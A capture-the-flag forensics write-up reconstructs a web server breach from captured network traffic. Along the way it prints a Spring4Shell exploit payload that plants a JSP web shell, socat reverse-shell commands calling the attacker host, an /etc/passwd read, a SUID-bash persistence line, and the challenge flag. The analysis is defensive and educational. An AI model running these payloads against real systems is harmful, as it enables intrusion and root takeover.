---
layout: default
title: Wrong Spooky Season
---

# [Hack The Boo](index.md) - Forensics - Wrong Spooky Season

**Difficulty:** Easy

> "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.

We are given a zip file with a pcap file inside it.

A quick glance through this pcap file shows that much of the traffic is http.

Starting at packet number `416`, we can see a web request for the file `e4d1c32a56ca15b3.jsp` with querystring `?cmd=whoami` - this looks like a web shell that accepts commands via the querystring, and the seemingly randomly generated filename indicates that this file is not supposed to be here.

```
416	30.555087	192.168.1.180	192.168.1.166	HTTP	246	GET /e4d1c32a56ca15b3.jsp?cmd=whoami HTTP/1.1
```

The web server appears to have the IP address `192.168.1.166`.
The attacker appears to be coming from the IP address `192.168.1.180`.

We can see that the attacker ran the following commands via this webshell:

```
416	30.555087	192.168.1.180	192.168.1.166	HTTP	246	GET /e4d1c32a56ca15b3.jsp?cmd=whoami HTTP/1.1
```
```
426	36.907155	192.168.1.180	192.168.1.166	HTTP	242	GET /e4d1c32a56ca15b3.jsp?cmd=id HTTP/1.1
```
```
436	47.456263	192.168.1.180	192.168.1.166	HTTP	266	GET /e4d1c32a56ca15b3.jsp?cmd=apt%20-y%20install%20socat HTTP/1.1
```
```
464	63.222005	192.168.1.180	192.168.1.166	HTTP	282	GET /e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash HTTP/1.1
```

The attacker used `apt` to install `socat`, a "multipurpose relay tool for linux". socat was used to download a malicious file from the attacker's computer via port `1337`, and run it via `bash`.

Filtering the pcap for port `1337` traffic we can see a number of conversations have happened between the server and attacker. We can use the filter `tcp.port == 1337 && ip.src == 192.168.1.180` to show commands sent from the attacker, and `tcp.port == 1337 && ip.src == 192.168.1.166` to see the replies (or just `tcp.port == 1337` to see them all at the same time).

Ignoring the TCP handshake packets, the packets appear to have data in them encoded in hex. The first packet from the attacker contains the value:
```
69640a
```

Using CyberChef to decode this from hex, we can see that this decodes to:
```
id
```

The following filter helps us see the entire conversation with the replies:
```
tcp.flags.push == 1 && tcp.port == 1337
```

Which are as follows (shown in encoded and decoded forms):

```
69640a

id
```

```
7569643d3028726f6f7429206769643d3028726f6f74292067726f7570733d3028726f6f74290a

uid=0(root) gid=0(root) groups=0(root)
```

```
67726f7570730a

groups
```

```
726f6f740a

root
```

```
756e616d65202d720a

uname -r
```

```
352e31382e302d6b616c69372d616d6436340a

5.18.0-kali7-amd64
```

```
636174202f6574632f7061737377640a

cat /etc/passwd
```

```
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130313a3130323a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
```

```
66696e64202f202d7065726d202d753d73202d74797065206620323e2f6465762f6e756c6c0a

find / -perm -u=s -type f 2>/dev/null
```

```
2f62696e2f73750a2f62696e2f756d6f756e740a2f62696e2f6d6f756e740a2f7573722f6c69622f646275732d312e302f646275732d6461656d6f6e2d6c61756e63682d68656c7065720a2f7573722f6c69622f6f70656e7373682f7373682d6b65797369676e0a2f7573722f62696e2f6e65776772700a2f7573722f62696e2f6368666e0a2f7573722f62696e2f677061737377640a2f7573722f62696e2f7061737377640a2f7573722f62696e2f636873680a

/bin/su
/bin/umount
/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
```

```
6563686f2027736f636174205443503a3139322e3136382e312e3138303a3133333720455845433a736827203e202f726f6f742f2e626173687263202626206563686f20223d3d6743394653493574474d7741336366526a64306f32587a30474e6a4e6a5966523363317032586e35574d7942584e66526a64306f32654352465322207c20726576203e202f6465762f6e756c6c2026262063686d6f64202b73202f62696e2f626173680a

echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
```

```
[malformed packet]
```

```
746f74616c2032304b0a64727778722d78722d78203120726f6f7420726f6f7420342e304b204f63742031302031373a3238202e0a64727778722d78722d78203120726f6f7420726f6f7420342e304b204f63742031302031373a3238202e2e0a2d7277787277782d2d2d203120726f6f7420726f6f7420312e384b204f63742020382030303a303420706f6d2e786d6c0a64727778722d78722d78203320726f6f7420726f6f7420342e304b204f63742031302031373a3237207372630a64727778722d78722d78203120726f6f7420726f6f7420342e304b204f63742031302031373a3238207461726765740a

total 20K
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
-rwxrwx--- 1 root root 1.8K Oct  8 00:04 pom.xml
drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target
```

In the second-to-last packet sent from the attacker we see `==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS`, which looks like it's encoded in base64, but backwards - the equal signs typically seen in base64 padding are at the start instead of the end, and this string is passed to the `rev` command to reverse it. Using CyberChef to reverse it and then base64 decode it, we find the flag for this challenge.

```
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```

# Reassembling the website to determine initial attack vector

We already have the flag, so this is just extra.

Wireshark can help us re-assemble the website, and this may help us determine how the attacker initially gained access to the server.

This filter helps us isolate the HTTP traffic: `http && ip.src == 192.168.1.166`. We can then save the packet data out into the website structure - I did this manually one file at a time.

![Wrong Spooky Season screenshot](for-wrong-spooky-season/for-wrong-spooky-season-01.png)

It looks like there is a contact form at the bottom of the page, so if it accepts HTTP POST data, this may be an attack vector.
![Wrong Spooky Season screenshot](for-wrong-spooky-season/for-wrong-spooky-season-02.png)

I noticed earlier that there was a `POST` from the attacker to the web server, so lets take a look at that.

I used this Wireshark filter:
```
http && ip.src == 192.168.1.180 && http.request.method == POST
```

and found three (which I cleaned up with CyberChef using _URL Decode_):

```
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_
```
```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=
```
Doing some quick Googling, this appears to be a `spring4shell` exploit ([CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)), which creates the webshell on the server. I found a lot of useful information about this exploit from https://www.dynatrace.com/news/blog/anatomy-of-spring4shell-vulnerability/.

So, the email form wasn't directly the attack vector, but it helped to think about HTTP POST data, which led us to the actual attack vector.

# Takeaways

- The web server should not have been running as `root`
- The web developers should have updated the version of Spring that they were using, where this RCE was patched.
  - Running an automated security scanner on their code or code repository may have alerted the developers to this issue
- The web server was able to send arbitrary TCP data to a remote client. An IDS/IPS, application proxy, or even just some firewall rules could have prevented the post-http parts of this attack (and potentially the initial attack as well).
